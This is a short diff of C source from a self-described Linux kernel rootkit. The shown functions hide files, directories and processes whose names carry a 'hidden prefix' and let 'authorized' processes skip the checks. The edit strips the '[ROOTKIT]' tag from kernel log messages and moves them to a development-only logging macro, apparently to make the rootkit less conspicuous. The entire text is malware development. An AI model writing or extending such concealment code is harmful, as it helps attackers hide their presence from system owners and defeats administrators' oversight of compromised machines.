@@ -315,13 +315,13 @@ static inline bool is_filename_or_pid_hidden(const char *const s_filename,
     pid_t i32_pid = 0; // PID as an integer
 
     IF_U (b_check_auth && is_process_authorized(PID_SELF)) {
-        pr_info("[ROOTKIT]   * Process is authorized, bypassing checks...\n");
+        pr_dev_info("  * Process is authorized, bypassing checks...\n");
         return false;
     }
 
     // Check the name starts with the hidden prefix
     IF_U (is_filename_hidden(s_filename)) {
-        pr_info("[ROOTKIT]   * This file name starts with the hidden prefix\n");
+        pr_dev_info("  * This file name starts with the hidden prefix\n");
         return true;
     }
 
@@ -362,7 +362,7 @@ static inline bool is_dentry_hierarchy_hidden(const dentry_t *const p_dentry)
     p_parent = p_dentry->d_parent;
     while (!IS_ROOT(p_parent)) {
         if (is_filename_hidden(p_parent->d_name.name)) {
-            pr_info("[ROOTKIT]   * Parent directory is hidden: %s\n", p_parent->d_name.name);
+            pr_dev_info("  * Parent directory is hidden: %s\n", p_parent->d_name.name);
             return true;
         }
 
